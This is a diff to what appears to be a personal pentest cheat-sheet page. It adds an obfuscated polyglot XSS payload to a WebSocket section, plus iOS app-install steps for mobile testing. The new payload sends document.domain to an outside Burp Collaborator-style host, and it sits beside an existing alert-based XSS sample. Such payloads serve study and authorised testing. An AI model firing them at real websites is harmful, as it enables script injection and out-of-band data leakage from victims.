@@ -2274,6 +2274,7 @@ Content-Length: 52<br><br>
 <h3 id="websocket">WebSocket</h3>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#obfuscated XSS payload
 &lt;img src=1 oNeRrOr=alert`1`&gt;
+javascript:/*&lt;/script>&lt;img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/xhimtswq52xicq8zk214xfqfi6oxcz0oX;.burp.icedcaphe.net?x=/+document.domain).replace(/.;/g,[])]//'src=>
 </code></pre></div></div>
 
 <h3 id="open-redirect">Open Redirect</h3>
@@ -2519,6 +2520,16 @@ jad ./com/pentesterlab/demo/MainActivity.class (-> MainActivity.jad -> change fi
     (Wins) ssh -R 5555:127.0.0.1:5555 kali@192.168.157.128
 
     (kali) adb devices
+</code></pre></div></div>
+
+<h4 id="mobile-pentest-process">iOS Setup</h4>      
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Connect iphone device with Kali VM
+<img src="./OSCP%20personal%20cheatsheet_files/jwt_jwks-spoofing.png">
+2. Run command from Kali:
+    ideviceinstaller list
+    ideviceinstaller install &lt;file.ipa>
+3. Verify installed app in iphone:
+    Settings > General > VPN & Device Management
 </code></pre></div></div>
 
 <h4 id="mobile-pentest-process">Process</h4>	  
